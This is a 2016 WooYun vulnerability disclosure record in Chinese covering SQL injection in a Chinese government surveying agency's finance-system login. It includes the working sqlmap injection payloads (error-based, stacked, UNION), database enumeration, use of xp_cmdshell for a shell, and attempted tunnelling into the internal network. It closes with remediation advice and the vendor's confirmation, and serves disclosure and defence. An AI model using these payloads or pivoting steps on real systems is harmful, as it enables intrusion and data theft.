{"id": 88757, "wybug_id": "wooyun-2016-0214916", "wybug_title": "国家测绘地理信息局某系统一处漏洞可导致内网被渗透                                      ", "wybug_corp": "国家测绘地理信息局", "wybug_author": "S4kur4", "wybug_date": "2016-05-31 23:44", "wybug_open_date": "2016-07-17 14:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-07-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-17：\t细节向公众公开  简要描述： rt. 详细说明：  国家测绘地理信息局基准项目财务系统：**.**.**.**:1309\n\n此处的登录认证存在注入，可直接绕过。里面有大量的财务报表信息，具体有多少贵局应该清楚，就不赘述了。\nPOST /Ashx/hdlLogin.ashx?Method=Login HTTP/1.1Host: **.**.**.**:1309User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:1309/Content-Length: 31Connection: keep-aliveusername=admin&password=123456\n注入参数username：\nsqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: username=admin' AND 1329=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1329=1329) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113))) AND 'ywgR'='ywgR&password=123456    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: username=admin';WAITFOR DELAY '0:0:5'--&password=123456    Type: UNION query    Title: Generic UNION query (NULL) - 15 columns    Payload: username=admin' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(121)+CHAR(81)+CHAR(75)+CHAR(122)+CHAR(101)+CHAR(77)+CHAR(88)+CHAR(80)+CHAR(101)+CHAR(80)+CHAR(114)+CHAR(102)+CHAR(110)+CHAR(89)+CHAR(106)+CHAR(90)+CHAR(100)+CHAR(69)+CHAR(102)+CHAR(100)+CHAR(108)+CHAR(100)+CHAR(68)+CHAR(98)+CHAR(65)+CHAR(83)+CHAR(66)+CHAR(121)+CHAR(85)+CHAR(87)+CHAR(113)+CHAR(121)+CHAR(69)+CHAR(118)+CHAR(104)+CHAR(114)+CHAR(76)+CHAR(84)+CHAR(105)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&password=123456---[20:25:57] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008\n数据库9个，权限为sa：\navailable databases [9]:                                                                                                                  [*] baoth_jssold[*] baoth_oa[*] baothjzOld[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb\n由于数据库开启了xp_cmdshell，直接得到一个shell：\n\n内网：\n\n域下所有机器：\n\n由于没有公网IP就不能反弹回一个meterpreter，netstat后注意到3389开启状态，随即使用tuuna将3389转发到本地但瞬间被杀。tasklist后看到了360。后续想使用regeorg+socks5的方式但是上传的tunnel.aspx被告知编译错误，时间紧迫就没再尝试，应该还可以试试tunnel.asxh的。   漏洞证明：  考虑到如果有公网IP可能会拿到meterpreter，因此认为内网可能被渗透。   修复方案：  1.解决注入。2.关闭xp_cmdshell并对mssql降权。   版权声明：转载请注明来源 S4kur4@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-06-02 14:48 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向国家上级信息安全协调机构上报,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}